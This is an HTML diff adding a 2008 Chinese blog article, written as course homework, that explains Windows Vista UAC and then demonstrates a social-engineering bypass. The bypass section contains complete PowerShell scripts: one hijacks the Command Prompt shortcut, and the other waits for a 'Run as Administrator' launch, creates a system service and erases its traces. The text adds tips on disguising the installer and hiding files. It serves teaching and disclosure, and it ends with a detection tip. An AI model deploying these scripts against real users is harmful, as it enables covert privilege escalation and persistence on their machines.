@@ -1,0 +1,232 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>守株待兔骗过UAC - 你的阳光技术频道 www.65536.cn</title>
+<meta name="keywords" content="Windows Vista,UAC,User Account Control,Command Prompt,Windows PowerShell"/>
+<link rel="alternate" type="application/atom+xml" href="http://feed.feedsky.com/65536" />
+<link rel="stylesheet" type="text/css" href="/images/9/" />
+<script type="text/javascript" src="/lib/9.js?prettify"></script>
+</head><body>
+
+<div class="header">
+<h2><a href="http://yoursunny.com/">你的阳光</a></h2>
+<ul>
+<li><a href="http://m.yoursunny.com/"><span>个人</span></a></li>
+<li><a href="http://study.yoursunny.com/"><span>学习</span></a></li>
+<li><a href="http://www.65536.cn/"><span>技术</span></a></li>
+<li><a href="http://www.65536.cn/work/"><span>作品</span></a></li>
+</ul>
+<ol>
+<li><a href="http://yoursunny.com/">你的阳光</a></li>
+<li><a href="/">技术频道</a></li>
+<li><a href="../">文章</a></li>
+<li><span>守株待兔骗过UAC</span></li>
+</ol>
+</div>
+
+<div class="content">
+
+<div class="p"><div class="p-wrap">
+<h1 class="tit">守株待兔骗过UAC</h1>
+<div id="posts" class="p-body headers">
+
+<p class="byline">阳光男孩 发表于 2008-12-15 || <a href="http://yoursunny.com/study/IS219/">Windows安全原理与技术</a>作业</p>
+
+
+<p class="indent"><b>User Account Control (UAC)</b>是<b>Windows Vista</b>操作系统引入的一项安全基础架构技术。应用程序只拥有标准帐户权限，除非管理员明确授予其更高的权限。这样，只有用户信任的程序才能获得高权限，而恶意软件则没有对系统造成破坏所需的权限。[<a href="http://en.wikipedia.org/wiki/User_Account_Control" rel="external">via</a>]</p>
+
+
+<h3>为什么需要UAC？</h3>
+<p class="indent">在2003年之前，我一直使用着Windows 98。Windows 98有一个“用户帐户”设置，设置后会在开机时出现密码输入框。可是我惊奇的发现，在密码输入框中简单的点击“取消”按钮，就可以进入系统，并且所有操作并不会受到限制。Windows 98的多个用户帐户，仅仅是桌面自定义的区分，并没有对操作权限作任何限制。如果想删除一个帐户，只需到C:\WINDOWS删掉<i>用户名.pwl</i>文件就可以了。</p>
+<p class="indent">2003年我开始使用Windows XP Professional。第一次打开新电脑，没有要求输入密码的提示，就直接进入了桌面。在安装完毕日常使用的软件后，我为Adminitrator帐户设置了密码，并且创建了一个Users组的帐户来进行日常操作。</p>
+<p class="indent">很快我发现，《写作之星WDS》软件无法正常启动了。作为正版用户，我给翰林汇公司打了电话；客服人员告诉我，1.0版本是为Windows 98设计的，在Windows XP中则必须使用管理员帐户才能启动。经过多次尝试，我发现只需把我的帐户加入Power Users组，就可以正常启动《写作之星WDS》，但是仍然无法打开和保存文件、只好复制、粘贴。</p>
+<p class="indent">2005年，我购买了高考英语口语考试的练习光盘，又发现无法启动。拨打客服电话，得到的回复是“你是Administrator帐户吗”。光盘外包装上清清楚楚写明“支持Windows XP”，可是我在Power Users组的帐户却仍然无法正常使用这款软件。</p>
+<p class="indent">许多用户习惯于在管理员帐户下进行日常操作。这种不够安全的使用习惯，又助长了软件厂商基于“用户在管理员帐户下操作”的假定来开发和测试软件。如果在非管理员帐户下打开这些软件，软件就不能正常工作——这就是所谓的<i>LUA bug</i>。反过来，这些软件厂商的客服人员不断告诉用户“请使用Administrator”，也就使更多用户养成了在管理员帐户下进行日常操作的“不良”习惯。天天使用Administrator的用户，更容易遭到恶意软件的攻击；受到影响的用户只会认为“Windows不安全”，而不会想到软件厂商的那种不正确的假定造成了什么。</p>
+<p class="indent">Microsoft决定采取一些措施，推动软件厂商开发能在Non-Admin下运行的软件，而使得用户不再依赖于Administrator。于是，UAC诞生了！</p>
+
+
+<h3>UAC的工作方式</h3>
+<p class="indent">当用户登录Windows Vista时，操作系统会为用户创建一个会话，同时为用户创建令牌。如果是普通用户帐户，只有一个“普通令牌”；如果是管理员用户(属于Administrators组的用户)，内核就将“买一送一”创建两个令牌——一个拥有完整权限的“特权令牌”，另一个“普通令牌”只有相当于普通用户的权限。然后，系统使用普通令牌创建桌面进程(explorer.exe)。用户总是在桌面进程中启动程序(包括桌面、开始菜单、资源管理器等都属于桌面进程)，因此用户启动的程序也就只拥有普通用户的权限。</p>
+<p class="indent">当用户需要执行系统管理任务的时候，例如安装一个新的软件、调整Windows防火墙配置，普通令牌的权限就不够用了，怎么办呢？默认情况下，管理员用户会看到一个变暗的桌面、只有一个对话框询问是否允许该程序用另一个特权令牌来启动，而普通用户则需要输入管理员的用户名、密码才能继续。</p>
+<p class="indent">假设，某人发给你一封邮件“我的照片”，附件是photo.jpg；于是你下载了这个附件，然后双击……而你并没有看到photo.jpg.exe后面的可执行扩展名。这是一个恶意软件，它试图创建一个系统服务木马。在Windows XP中，你的机器瞬间就沦为肉鸡——黑市价0.5元，而你的损失则远远不止这个数了。在Windows Vista中，photo.jpg.exe获得的普通令牌并没有创建系统服务的权限，于是你就看到了那个变暗的桌面和询问窗口，你应当知道图片浏览不应该有这样的现象，因此也就不会为它授予特权令牌。</p>
+<p class="indent">UAC的目标，就是<b>让普通用户、普通令牌成为Windows软件的标准，而特权令牌则只用于管理操作、决不是家常便饭</b>。</p>
+<p class="indent">软件开发和测试的成本是高昂的，使软件厂商改变其习惯的<i>Administrator假设</i>也是不容易的。UAC，仅仅迈出了第一步。</p>
+
+<h4>为什么Windows Vista不支持setuid？</h4>
+<p class="indent">linux支持setuid命令。管理员可以用setuid命令，将某个他<b>充分信任</b>的可执行文件标记为“以root权限运行”；此后任何用户调用这个可执行文件，都可以获得root权限。例如shutdown命令原本只能由root帐户调用，而家用计算机上对shutdown设置setuid后，每个用户都有关机权限了。</p>
+<p class="indent">Aaron Margosis<a href="http://blogs.msdn.com/aaron_margosis/archive/2007/06/29/faq-why-can-t-i-bypass-the-uac-prompt.aspx" rel="external">指出</a>，Windows Vista的设计者决定不支持“setuid”，同样是为了促使软件厂商抛弃<i>Administrator假设</i>。如果支持了setuid，软件厂商将会在安装程序中自动设置setuid，而<i>Administrator假设</i>也就永远不会被抛弃。</p>
+
+
+<h3>为Vista开发软件</h3>
+<p class="indent">作为Windows Vista最重要的安全改进之一，User Account Control是为Vista开发软件时首先要考虑的。“2005高考英语口语考试练习光盘”在标明支持Windows XP的情况下无法再Power Users组的帐户中运行，这是基于<i>Administrator假设</i>；而到了Vista时代，软件厂商无法再依赖于<i>Administrator假设</i>——Administrator帐户默认是禁用的、开启的UAC又限制了所有“管理员帐户”的权限。</p>
+<p class="indent">软件厂商的客服，很快就要忙不过来了：指导用户启用Administrator帐户、或者禁用UAC，都是相当复杂的操作。要求用户点击Allow或Continue虽然可行，但是每天的N次点击使用户感到相当麻烦。设计UAC的项目经理David Cross<a href="http://news.zdnet.com/2100-9590_22-197085.html" rel="external">说</a>，UAC就是要“annoy users”，以用户的抱怨对喜欢<i>Administrator假设</i>的软件厂商施加压力。</p>
+<p class="indent">那么，作为软件厂商，应该如何使自己的软件在UAC启用的状况下正常工作呢？</p>
+<ul>
+<li>测试人员应该将普通令牌下无法进行日常工作的LUA bug视为一个真正的bug，并要求开发人员予以修正[<a href="http://blogs.msdn.com/aaron_margosis/archive/2006/02/16/fixing-lua-bugs-part-i.aspx" rel="external">via</a>]</li>
+<li>开发时应避免进行被UAC阻止的操作。这类操作主要包括：[<a href="http://blogs.msdn.com/aaron_margosis/archive/2006/02/06/what-is-a-lua-bug-and-what-isn-t-a-lua-bug.aspx" rel="external">via</a>]<ul>
+<li>写入注册表的<i>HKEY_LOCAL_MACHINE</i>键。许多软件会在启动时作扩展名关联，就可能产生LUA bug。你应该在<i>HKEY_CURRENT_USER</i>写入</li>
+<li>写入文件系统的<i>C:\windows</i>、<i>C:\Program Files</i>目录。这种软件的一个例子是腾讯QQ，它会在安装目录下生成一个以用户QQ号命名的目录。有些软件会使用ini文件保存设置，也会导致这类问题。你应该在<i>C:\Users\用户名</i>内的合适位置写入。</li>
+</ul></li>
+<li>对于管理任务，用“盾牌”图标提示，并用ShellExecute创建新进程、经过UAC确认后执行管理任务；管理任务执行完毕，应马上退出。</li>
+<li>确实需要特权的程序，用manifest告诉操作系统，以便在程序启动时就经过UAC确认并获得特权令牌。</li>
+</ul>
+<p class="indent">极少数软件厂商选择了<b>回避</b>。中国工商银行的U盾无法在Vista中正常使用，专家客服称：“<a href="http://zhidao.baidu.com/question/22690481.html" rel="external">我行目前只对win98、2000、xp做过测试，请您更换这几种操作系统后使用我行网银</a>”。有同学去咨询Vista网银的问题，工行客服还对他说“Vista在中国没有正式发售”。</p>
+
+<h4>旧软件怎么办？</h4>
+<p class="indent">在Windows Vista出现之前，市面上已经存在大量软件产品——它们有的是针对Windows 98开发的，更多的是基于<i>Administrator假设</i>开发的。针对上面提到的两类最常导致LUA bug的操作，Vista系统本身引入了“数据重定向”技术以提高兼容性。</p>
+<p class="indent"><b>数据重定向</b>，又称<b>文件系统和注册表虚拟化</b>。当软件试图写入<i>C:\Program Files</i>目录或<i>HKEY_LOCAL_MACHINE\Software</i>键时，如果当前令牌没有相应的写入权限，系统会将这类写入操作重定向到用户有权写入的位置。这种重定向对于应用程序是透明的，随后的读取操作也会做相应的重定向。[<a href="http://en.wikipedia.org/wiki/Windows_Registry#Registry_virtualization" rel="external">via</a>]</p>
+<p class="indent">通过数据重定向技术，大部分旧软件就能在Windows Vista下正常运行。</p>
+
+<h4>脚本与UAC</h4>
+<p class="indent">几天前，我在写一个通过修改<i>C:\windows\system32\drivers\etc\hosts</i>文件来自定义域名解析的VBScript脚本。hosts文件位于<i>C:\windows</i>目录以内，因此必然需要经过UAC提升权限后使用特权令牌来执行这个操作。exe程序可以通过manifest要求使用特权令牌，而文本格式的VBScript脚本是无法嵌入manifest的。<a href="http://www.winhelponline.com/articles/185/1/VBScripts-and-UAC-elevation.html" rel="external">Ramesh Srinivasan给出了一段脚本</a>：</p>
+<pre class="prettyprint lang-vbs">If WScript.Arguments.Length=0 Then
+  Set objShell = CreateObject("Shell.Application")
+  'Pass a bogus argument with leading blank space, say [uac]
+  objShell.ShellExecute "wscript.exe", Chr(34) &amp; _
+  WScript.ScriptFullName &amp; Chr(34) &amp; " uac", "", "runas", 1
+Else
+  'Add your code here
+End If</pre>
+<p class="indent">通过带有<b>runas</b>的ShellExecute函数，显式要求特权令牌。</p>
+<p class="indent">这段脚本产生的UAC授权窗口如下：<br/>
+<img src="http://i27.tinypic.com/orrv2t.jpg" width="439" height="241" alt="wscript.exe的UAC提示"/><br/>
+UAC授权窗口有四种不同的颜色，<a href="http://blogs.msdn.com/oldnewthing/archive/2007/03/30/1991616.aspx" rel="external">蓝、灰、黄、红分别表示不同的信任级别</a>；这个授权窗口的标题栏颜色是蓝色，这表示该进程(wscript.exe)是Windows Vista的一个组件。请注意，窗口上仅仅给出了wscript.exe的程序描述<i>Microsoft&reg; Windows Based Script Host</i>，而没有显示将要执行vbs脚本文件名。</p>
+
+
+<h3>守株待兔骗过UAC</h3>
+<p class="indent">User Account Control是Windows Vista最重要的安全特性之一，而<b>人</b>就是信息系统中最脆弱的环节。<b>社会工程学</b>是很有用的攻击手段：photo.jpg.exe、电影<a href="http://www.imdb.com/title/tt0408345/" rel="external">Firewall</a>讲述的故事……都是社会工程学的攻击实例。现在，我们就<b>用社会工程学突破UAC</b>。</p>
+
+<h4>UAC的骗术</h4>
+<p class="indent">从上面的UAC授权窗口可以看出，授权窗口的颜色和文字提示是根据进程的可执行文件确定的，而与调用可执行文件的参数无关。虽然点击Details按钮可以看到可执行文件的完整路径及全部参数，但是大部分用户看到蓝色的“Windows Vista组件”要求授权时，只是简单的点击确定了事；尤其是用户在开始菜单中右击某个快捷方式然后选择“Run as Administrator”时，更不会去点击Details按钮看个究竟。</p>
+<p class="indent">iPhone不允许软件未经许可执行第三方代码，而Windows作为一个开放平台显然不会这么做。Windows Vista有许多内置组件可以通过命令行参数执行其他代码，例如：</p>
+<ul>
+<li>wscript.exe</li>
+<li>cscript.exe</li>
+<li>cmd.exe</li>
+<li>rundll32.exe</li>
+<li>powershell.exe</li>
+<li>iexplore.exe</li>
+<li>mmc.exe</li>
+</ul>
+<p class="indent">试想：替换掉一个快捷方式，当用户选择<i>Run as Administrator</i>并通过了UAC授权后……你就获得了最高权限！</p>
+<p class="indent">UAC的设计目的是让UAC授权窗口不要天天出现、而只用于管理任务。大部分管理任务是在控制面板中完成的，而另一些管理任务则必须通过命令提示符完成。命令提示符(cmd.exe)可以直接点击快捷方式在普通令牌下打开，也可以用<i>Run as Administrator</i>命令在特权令牌下打开。cmd.exe可能是最常获得特权令牌的Windows Vista组件。</p>
+<p class="indent">下面，我将使用<a href="http://www.microsoft.com/windowsserver2003/technologies/management/powershell/default.mspx" rel="external">Windows PowerShell</a>语言对上述方法进行演示。</p>
+
+<h4>偷梁换柱</h4>
+<p class="indent">Windows Vista开始菜单中的命令提示符Command Prompt快捷方式，就是当前帐户的开始菜单目录内<i>Programs\Accessories\Command Prompt.lnk</i>文件。Programs目录究竟在磁盘上的哪个位置，不但与用户名有关、而且与用户配置文件(profile)的类型有关。可以基本肯定的是，用户能够用普通令牌写入这个目录。</p>
+<p><img src="http://i30.tinypic.com/30l2yo6.png" width="520" height="344" alt="Accessories目录"/>
+<img src="http://i27.tinypic.com/j5dw7t.png" width="343" height="344" alt="正常的Command Prompt.lnk"/></p>
+<p class="indent">借助.Net的强大威力，用<code class="prettyprint lang-ps1">$accessories=Join-Path ([System.Environment]::GetFolderPath("Programs")) "Accessories"</code>就可以取得Accessories目录的路径。注意：在Windows Vista的本地化版本中，“Accessories”这个名称可能会有变化；因此目前这个演示脚本只能适用于英文版本的Windows Vista。</p>
+<p class="indent">找到Accessories目录后，只要其中存在<i>Command Prompt.lnk</i>文件，就重新建立一个含有特殊参数的新快捷方式。<br/>
+<img src="http://i25.tinypic.com/126g16q.png" width="507" height="460" alt="被替换的Command Prompt.lnk"/></p>
+<p class="indent">cmd.exe后面加上了参数<i>/k powershell path\to\cmd.ps1</i>，而cmd.ps1已经被复制到当前用户profile的AppData目录。这样，每次用这个快捷方式打开命令提示符，都会先调用powershell执行cmd.ps1脚本(此脚本内容后面介绍)，执行完毕后保留命令提示符窗口、而不退出。</p>
+<p class="indent">install.ps1的完整代码如下：</p>
+<pre class="prettyprint lang-ps1">
+# copy cmd.ps1 to ApplicationData
+$appdata=[System.Environment]::GetFolderPath("ApplicationData")
+$cmd_ps1=Join-Path $appdata "cmd.ps1"
+Copy-Item cmd.ps1 $cmd_ps1
+
+$accessories=Join-Path ([System.Environment]::GetFolderPath("Programs")) "Accessories"
+$cmd_lnk=Join-Path $accessories "Command Prompt.lnk"
+if (Test-Path $cmd_lnk) {
+  $cmd_backup=Join-Path $appdata "cmd.lnk"
+  Copy-Item $cmd_lnk $cmd_backup
+}
+$wshshell=New-Object -com WScript.Shell
+$shortcut=$wshshell.CreateShortCut($cmd_lnk)
+$shortcut.TargetPath="C:\windows\system32\cmd.exe"
+$shortcut.Description="Performs text-based (command-line) functions."
+$shortcut.WorkingDirectory="%HOMEDRIVE%%HOMEPATH%"
+$shortcut.Arguments="/k powershell "+$cmd_ps1
+$shortcut.Save()
+</pre>
+<p class="indent">为了更方便执行install.ps1，再写一个install.cmd调用它，一双击就能运行：</p>
+<pre class="prettyprint lang-cmd">
+@ECHO OFF
+powershell .\install.ps1
+</pre>
+<p class="indent">接下来还可以进一步发挥，比如：与游戏一起打包成WinRAR自解压档案、然后换成Flash图标……总之是<b>让受害者运行install.ps1，完成对Command Prompt快捷方式的“偷梁换柱”</b>。受害者需要安装有Windows PowerShell 1.0；聪明的你当然也可以用VBScript写出相同功能的代码。</p>
+
+<h4>守株待兔</h4>
+<p class="indent">经过“偷梁换柱”，打开命令提示符时可以运行一个自定义的PowerShell脚本，也就是cmd.ps1。不过，这时候还没有获得特权令牌，只能等待用户在一次次运行命令提示符中，“发发善心”点击Run as Administrator——这就是“守株待兔”的含义。</p>
+<p class="indent">几天以来，可怜的受害者都是以普通令牌打开命令提示符。什么也没有发生，不过我要严肃的指出四点：</p>
+<ol>
+<li>启动PowerShell，在1.8GHz CPU的计算机上有0.3秒的时延，并不明显。用VBScript写，可能会快一点儿。</li>
+<li>在那0.3秒载入PowerShell的时间内，窗口的标题栏不正常：<br/>
+<img src="http://i25.tinypic.com/md1u6r.png" width="842" height="80" alt="命令提示符窗口标题栏出现powershell"/><br/>
+很容易打草惊蛇啊，没有办法解决(即使换成VBScript也不能解决)，祈祷吧。</li>
+<li>如果过于聪明的受害者对原来的Command Prompt.lnk定义了键盘快捷键(我就习惯于按下CTRL+ALT+SHIFT+C打开命令提示符)，快捷键将会失效(不过在成功获得特权令牌后能恢复)。聪明人不上当～</li>
+<li>install.ps1脚本会在AppData目录写入cmd.ps1文件、及备份Command Prompt.lnk，容易被有心的用户发现、然后随手删除(即使他不知道这些文件有什么用处)，此时将导致今后打开命令提示符时出现错误信息。<br/><img src="http://i32.tinypic.com/vhfec2.png" width="520" height="344" alt="AppData目录中的文件"/><br/>聪明的你，可以把这些文件藏在深深的目录里，只要是普通令牌有写入权限的地方都可以。</li>
+</ol>
+<p class="indent">然后，命令提示符正常打开，就像什么也没有发生过似的：<br/>
+<img src="http://i31.tinypic.com/652875.png" width="842" height="165" alt="命令提示符"/><br/>
+cmd.exe的/k参数会造成Microsoft Windows……那两行字不显示，这两行字实际上是PowerShell输出的；Windows Vista的每个Service Pack都会改变版本号，而这里不会改变，但是没人会注意到的。</p>
+<p class="indent">终于有一天——<br/>
+<img src="http://i30.tinypic.com/29f9nqu.png" width="323" height="351" alt="Run as Administrator"/>
+<img src="http://i25.tinypic.com/xfxmia.jpg" width="495" height="327" alt="UAC授权窗口"/></p>
+<p class="indent">受害者仍然毫无感觉：<br/>
+<img src="http://i27.tinypic.com/2wqzeyb.png" width="842" height="131" alt="Administrator: Command Prompt"/><br/>
+而且，cmd.ps1文件被删除，原来的Command Prompt.lnk被恢复。</p>
+<p class="indent">而攻击已经成功了：<br/>
+<img src="http://i26.tinypic.com/e7yte8.png" width="400" height="416" alt="创建了UACtest系统服务"/></p>
+<p class="indent">cmd.ps1的完整代码如下，其中的Get-AdminStatus函数来自<a href="http://blogs.msdn.com/aaron_margosis/archive/2007/06/27/follow-up-on-setting-color-for-all-cmd-shells-based-on-admin-elevation-status.aspx" rel="external">Aaron Margosis' "Non-Admin" WebLog</a>：</p>
+<pre class="prettyprint lang-ps1">
+function Get-AdminStatus
+{
+  $id=[System.Security.Principal.WindowsIdentity]::GetCurrent()
+  $p=New-Object System.Security.Principal.WindowsPrincipal($id)
+  return $p.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
+}
+
+if (Get-AdminStatus) {
+  #admin now, do what you want
+  sc.exe create UACtest start= demand binPath= "D:\UACtest.exe"
+  
+  #revert changes
+  $appdata=[System.Environment]::GetFolderPath("ApplicationData")
+  $cmd_ps1=Join-Path $appdata "cmd.ps1"
+  $accessories=Join-Path ([System.Environment]::GetFolderPath("Programs")) "Accessories"
+  $cmd_lnk=Join-Path $accessories "Command Prompt.lnk"
+  $cmd_backup=Join-Path $appdata "cmd.lnk"
+  Remove-Item $cmd_lnk
+  if (Test-Path $cmd_backup) {
+    Move-Item $cmd_backup $cmd_lnk
+  }
+  Remove-Item $cmd_ps1
+}
+
+# show normal cmd.exe header
+Clear-Host
+Write-Host "Microsoft Windows [Version 6.0.6001]"
+Write-Host "Copyright (c) 2006 Microsoft Corporation.  All rights reserved."
+</pre>
+
+<h4>原形毕露</h4>
+<p class="indent">如果不是天天检查快捷方式指向的目标，受害者只有唯一的机会让这种攻击原形毕露——<b>在每一个UAC授权窗口中点击<i>Details</i>并检查命令行参数</b>：<br/>
+<img src="http://i32.tinypic.com/2whjz2p.jpg" width="496" height="391" alt="UAC授权窗口的Details"/></p>
+<p class="indent">很容易发现，要运行的程序，后面跟着一大串参数，显然有问题！马上点击Cancel，然后顺藤摸瓜/清理痕迹/全盘杀毒/<a href="http://bbs.sjtu.edu.cn/bbsdoc?board=virus" rel="external nofollow">求助高手</a>……</p>
+<p class="indent">顺便提一句，两张UAC授权窗口的图片特别模糊，是因为显示授权窗口的时候根本无法截图！我是用照相机对着屏幕拍摄的。默认情况下，UAC授权窗口将显示在<b>安全桌面</b>上，应用程序无法访问它，PrintScreen键也不起作用；此时，应用程序无法通过控制鼠标或者发送键盘/鼠标消息来点击Continue按钮。不过，这个安全桌面的选项可以在组策略中关闭，但是那样很不安全。</p>
+
+
+<h3>UAC的下一代</h3>
+<p class="indent">User Account Control是Vista为了促使“普通帐户”成为默认权限而作的努力，但是频繁的UAC授权窗口影响了用户体验。在组策略中可以设置无交互自动授权，相当于没有UAC，这种配置只适合于自动化测试环境。<a href="http://www.nortonlabs.com/inthelab/uac.php" rel="external">Norton User Account Control Tool</a>在改善用户体验方面作了有益的尝试，它会自动学习用户的操作、逐步建立黑白名单，然后根据黑白名单自动应答一部分UAC授权窗口，减少了用户需要手动应答的UAC授权窗口数量。</p>
+<p class="indent">UAC是桌面计算机安全性提升的一种解决方案，然而信息系统正逐步走向<a href="CS-BS.htm">B/S、云计算</a>。B/S、云计算应用是运行在浏览器中、存储于服务器上的，无法直接应用现有的UAC技术。同时，它们却又变得越来越重要，以至于攻击者对它们的兴趣与日俱增。UAC需要改进，以便用于B/S、云计算应用：例如，结合RSA SecureID完成授权。</p>
+<p class="indent">桌面安全、信息系统安全还有很长的路要走，UAC只是其中的一小步，仅此而已。</p>
+
+
+</div></div></div>
+
+</div>
+
+<div class="footer">
+<p class="copyright">&copy;2006-2009 yoursunny.com, CreativeCommons BY-NC 3.0</p>
+<ul class="links">
+<li><a href="http://yoursunny.com/m/about.htm">关于本站</a></li>
+<li><a href="http://yoursunny.com/m/contact.htm">联系方式</a></li>
+<li><a href="http://yoursunny.com/m/sitemap.htm">网站地图</a></li>
+</ul>
+</div>
+
+</body></html>
